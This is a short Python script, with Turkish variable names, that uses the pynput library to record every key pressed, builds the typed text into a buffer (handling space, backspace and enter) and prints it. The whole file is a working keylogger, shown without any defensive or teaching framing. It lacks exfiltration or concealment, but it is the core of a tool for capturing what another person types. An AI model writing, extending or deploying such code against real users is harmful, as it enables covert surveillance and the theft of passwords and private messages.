import pynput.keyboard

toplama = ""

def key(logger):
    global toplama
    try:
        toplama += str(logger.char)
    except AttributeError:
        if logger == pynput.keyboard.Key.space:
            toplama += " "
        elif logger == pynput.keyboard.Key.backspace:
            toplama = toplama[:-1]
        elif logger == pynput.keyboard.Key.enter:
            toplama += "\n"
        else:
            toplama += str(logger)
    print(toplama)

arizona_kertenkelesi = pynput.keyboard.Listener(on_press=key)

with arizona_kertenkelesi:
    arizona_kertenkelesi.join()